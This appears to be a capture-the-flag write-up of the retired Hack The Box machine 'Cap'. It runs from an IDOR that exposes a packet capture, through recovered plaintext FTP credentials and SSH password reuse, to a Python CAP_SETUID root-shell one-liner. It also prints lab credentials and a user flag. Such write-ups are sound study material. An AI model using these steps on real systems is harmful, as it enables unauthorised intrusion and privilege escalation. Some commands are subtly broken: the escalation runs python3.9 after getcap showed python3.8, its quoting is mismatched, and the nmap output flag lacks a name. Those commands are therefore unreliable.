# Cap - Retired HTB Machine

## Overview

Cap is a Linux machine that combines a web authorization weakness with exposed network-capture data, password reuse, and an unsafe Linux file capability.

The attack path was straightforward once the individual weaknesses were connected:

```text
Web application
    ↓
IDOR exposes another user's packet capture
    ↓
FTP credentials recovered from plaintext traffic
    ↓
Password reuse provides SSH access
    ↓
Python has CAP_SETUID
    ↓
Root shell
```

## Initial enumeration

I began with service disovery to identify the exposed attack surface:

```bash
nmap -sC -sV -oA <TARGET_IP>
```

The scan identified three TCP services:

```text
21/tcp FTP
22/tcp SSH
80/tcp HTTP
```

The web app was the most likely starting point because it expoed an administrative looking interface and a feature for generating network captures.

## IDOR - Insecure Direct Object Reference

The app's **Security Snapshot** feature generated a downloadable packet capture and redirected the browser to a path similar to:

```text
/data/40
```

The numeric identifier suggested that the capture was being retrieved directly by object ID.

I chagned the identifier and requested other values. Most returned uninteresting data, but requesting:

```text
/data/0
```

returned a capture that did not belong to the current session.

This confirmed an IDOR: the app accepted an attacker controlled object identifier without verifying that the authenticated user was authorised to access hte corresponding capture.

### Security impact

The weakness allowed one user to access network captures belonging to another user. Because packet captures can contain authentication material and sensitive app traffic, the authorization failure became more serious than ordinary information disclosure.

### Root cause

The app retrieved capture objects by identifier but did not enforce object-level authorization.

Changing an identifier should never be enough to access another user's resource.

## Packet-capture analysis

I opened the exposed capture in Wireshark and reviewed the applicataion-layer protocols.

The FPT conversation contained a username and password in plaintext.

```text
Username: nathan
Password: Buck3tH4TF0RM3!
Protocol: FTP
```

FTP does not protect credentials with transport encryption, so anyone able to read the traffic can recover them directly.

The IDOR and the use of plaintext FTP therefore formed a complete credential-disclosure path:

```text
Missing object-level authorization
    +
Sensitive packet capture
    +
Plaintext authentication protocol
    =
Recoverable user credentials
```

## Initial foothold

SSH was also exposed on the target. I tested whether the recovered FTP password had been reused:

```bash
ssh nathan@<TARGET_IP>
```

The credential was accepted, providing an interactive shell as the local user `nathan`.

This was not a weakness in SSH itself. The foothold was possible because the same password was used for both FTP and SSH.

After logging in, the flag is located on the home directory which is done after opening the `user.txt`.

```bash
cat user.txt
9f961b671cb52c104970990247004b94
```

## Privilege escalation

After establishing the shell, I checked for file capabilities:

```
getcap -r / 2>/dev/null
```

The important result was:

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`CAP_SETUID` permits a process to change its user IDs. Assiging this capability to a general-purpose interpreter is dangerous because an unprivileged user can execute arbitrary Python code that changes hte process UID to `0`.

The capability was validated with:

```bash
/usr/bin/python3.9 -c `import os; os.setuid(0); os.execl("/bin/sh", "sh", "-p")'
```

The resulting shell ran as:

```text
uid=0(root)
```

## Result

The full compromise required four separate weaknesses:

1. Missing object-level authorization exposed another user's capture
2. FTP transmitted credenitals in plaintext
3. The same password was reused for SSH
4. A general-purpose Python interpreter had `CAP_SETUID`

## What I learned

The strongest lesson was how quickly a low-complexity web authorization flaw can become a full system compromise when sensitive captures, weak protocol choices, reused passwords, and unsafe host configuration are present at the same time.

The privilege escalation step also reinforced that Linux capabilities should be reviewed alongside SUID binaries, schedules tasks, services, and `sudo` permissions during local enumeration.

## References

- [Hack The Box: Cap](https://www.hackthebox.com/machines/cap)
- [OWASP: Insecure Direct Object Reference Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html)
- [Linux capabilities manual](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Linux setuid manual](https://man7.org/linux/man-pages/man2/setuid.2.html)

---

[Back to repository overview](../../README.md)
